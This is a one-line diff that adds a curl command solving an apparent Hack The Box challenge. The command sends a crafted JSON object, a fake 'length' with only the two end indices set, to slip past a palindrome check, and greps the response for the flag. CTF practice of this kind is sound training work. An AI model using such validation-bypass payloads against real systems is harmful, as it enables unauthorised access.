@@ -1,0 +1,1 @@
+curl -s http://94.237.61.52:31156 -H 'Content-Type: application/json' -d '{"palindrome":{"length":"1000","0":"","999":""}}' | rg -oP 'HTB{.*}'
